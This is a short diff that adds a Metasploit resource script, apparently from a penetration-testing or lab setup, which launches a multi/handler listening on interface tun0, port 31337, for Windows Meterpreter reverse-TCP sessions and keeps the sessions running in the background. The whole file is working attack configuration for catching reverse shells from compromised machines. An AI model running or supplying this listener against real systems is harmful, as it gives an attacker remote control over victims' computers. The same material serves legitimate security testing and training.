@@ -1,0 +1,7 @@
+# meterpreter/l.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
